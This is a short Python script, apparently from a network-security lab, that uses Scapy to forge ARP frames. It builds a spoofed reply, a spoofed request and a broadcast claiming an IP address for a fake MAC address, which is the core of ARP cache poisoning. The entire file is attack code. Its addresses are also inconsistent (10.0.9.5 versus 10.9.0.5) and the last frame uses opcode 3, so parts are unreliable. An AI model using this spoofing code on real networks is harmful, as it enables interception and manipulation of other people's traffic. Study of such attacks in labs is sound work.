from scapy.all import *

IP_V = "10.0.9.5"
MAC_V_real = "02:42:0a:09:00:05"

IP_T = "10.0.9.99"
MAC_T_fake = "aa:bb:cc:dd:ee:ff"

ether1 = Ether(src = MAC_T_fake, dst = MAC_V_real)

arp1 = ARP(psrc = IP_T, hwsrc = MAC_T_fake,
        pdst = IP_V, hwdst = MAC_V_real)

arp1.op = 2

frame1 = ether1/arp1

#sendp(frame1)

ether2 = Ether(src="aa:bb:cc:dd:ee:ff",
	dst = "ff:ff:ff:ff:ff:ff")
arp2 = ARP(psrc = "10.9.0.99", hwdst = "aa:bb:cc:dd:ee:00",
	pdst = "10.9.0.5")
arp2.op = 1

frame2 = ether2/arp2

#sendp(frame2)

IP_fake = "10.9.0.99"
ether3 = Ether(src = "aa:bb:cc:dd:ee:00",
         dst = "ff:ff:ff:ff:ff:ff")
arp3 = ARP(psrc = IP_fake, hwsrc = "aa:bb:cc:dd:ee:ff",
         pdst = IP_fake, hwdst = "ff:ff:ff:ff:ff:ff")

frame3 = ether3/arp3

arp3.op = 3

sendp(frame3)
